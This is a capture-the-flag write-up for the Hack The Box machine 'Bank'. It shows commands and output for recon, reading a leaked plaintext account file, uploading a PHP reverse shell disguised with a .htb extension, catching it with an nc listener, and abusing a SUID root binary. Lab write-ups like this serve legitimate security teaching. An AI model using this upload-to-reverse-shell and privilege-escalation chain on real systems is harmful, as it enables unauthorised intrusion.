---
title: Bank
summary: Hack The Box Linux machine where a plaintext account file leaks login creds, a .htb upload quirk gives a PHP reverse shell as www-data, and a SUID emergency binary hands over root.
date: 2026-10-21
tags: [Hack The Box, File Upload, SUID, PHP, Password Disclosure]
difficulty: easy
os: Linux
url: https://app.hackthebox.com/machines/Bank
---

# CTF Room: Bank
- [Link to machine](https://app.hackthebox.com/machines/Bank)
- **Difficulty:** Easy
- **Category:** File Upload / SUID
- **OS:** Linux

## 1. Brief
Bank is a web box with a tidy chain: a directory of "encrypted" account files has one that failed to encrypt and leaks login creds in cleartext, the app happily runs uploaded files with a `.htb` extension as PHP so a support ticket becomes a reverse shell, and a custom SUID `emergency` binary left on the box drops a root shell on sight.

---

## 2. Recon

### NMAP Scan
The box uses a hostname, so `bank.htb` goes in `/etc/hosts` first, then the scan.

```bash
nmap -sVC -p22,53,80 bank.htb
```
```text
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: HTB Bank - Login
|_Requested resource was login.php
```

SSH, a BIND DNS server, and Apache serving an "HTB Bank" login page that redirects to `login.php`. The web app is the obvious way in.

### Directory Brute Force
A content scan to map the app.

```bash
feroxbuster -u http://bank.htb/
```
```text
301  http://bank.htb/uploads => http://bank.htb/uploads/
301  http://bank.htb/inc => http://bank.htb/inc/
200  http://bank.htb/inc/user.php
200  http://bank.htb/inc/ticket.php
302  http://bank.htb/ => login.php
```

There is an `/uploads` directory and an `/inc` folder with the app's PHP includes, but the login wall is in the way. The scan does not surface it directly, but adding the DNS server to `/etc/hosts` and poking around turns up a `/balance-transfer` directory, and that is where the box opens up.

### The balance-transfer directory
`/balance-transfer` is a listing full of `.acc` account files, all named with long hex strings and all roughly the same size, each one an encrypted account record. Sorting the listing by size, one file is a different length from the rest, which is the tell that something went wrong with it.

```bash
curl http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
```
```text
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: ||!##HTBB4nkP4ssw0rd!##||
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

The `ERR ENCRYPT FAILED` header says it all: the encryption routine bailed on this one record and wrote it out in plaintext. That gives me `chris@bank.htb` and the password `||!##HTBB4nkP4ssw0rd!##||`, which log straight into the bank dashboard.

---

## 3. Foothold - .htb Upload to PHP Reverse Shell

Logged in, the dashboard has a support ticket page with a file attachment. The interesting part is a comment left in the page source:

```text
<!-- [DEBUG] I added the .htb to execute as php for development purposes only [DEBUG] -->
```

So the server is configured to run any file with a `.htb` extension as PHP. That turns the attachment field into arbitrary PHP execution: upload a PHP web shell named with `.htb` instead of `.php` and it still runs.

I grabbed a PHP reverse shell from [revshells.com](https://www.revshells.com/) (the classic pentestmonkey one), set my IP and port, and saved it with a `.htb` extension. Listener up first:

```bash
nc -lvnp 1337
```

Then I uploaded the ticket and browsed to the file in `/uploads` to trigger it. The shell comes back as `www-data`.

```text
Connection received on machine_ip 35848
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP i686 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The user flag is in chris's home directory.

```bash
cat /home/chris/user.txt
```
```text
||dcdea420d82a4778****************||
```

---

## 4. Privilege Escalation - SUID emergency binary

With a shell, I looked for SUID root binaries, since any of them run as root regardless of who calls them.

```bash
find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null
```
```text
-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
-rwsr-xr-x 1 root root   5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
...
```

Everything under `/usr/lib` is standard, but `/var/htb/bin/emergency` is not. It is a custom binary dropped into a custom path, SUID root, with a name that promises exactly what it does. I just ran it.

```bash
cd /var/htb/bin
./emergency
```
```text
# whoami
root
```

It hands back a root shell with no questions asked. The root flag follows.

```bash
cat /root/root.txt
```
```text
||033addeb173b2b80****************||
```

---

## 5. Flags / Proof

| Flag | Value |
|:--|:--|
| User flag | `||dcdea420d82a4778****************||` |
| Root flag | `||033addeb173b2b80****************||` |

---

## 6. Summary
Bank is three small mistakes stacked on top of each other.

- **A leaked record.** The `/balance-transfer` directory encrypts its account files, but one failed and was written in plaintext. Spotting the odd-sized file leaks chris's login password.
- **An upload foothold.** A debug comment reveals the server runs `.htb` files as PHP, so the support ticket attachment becomes a PHP reverse shell as `www-data`.
- **A SUID backdoor.** A custom `emergency` binary sits SUID root in `/var/htb/bin` and spawns a root shell when run. No exploit needed, just run it.

**Tools used:** `nmap`, `feroxbuster`, `curl`, a browser, `nc`, `find`.
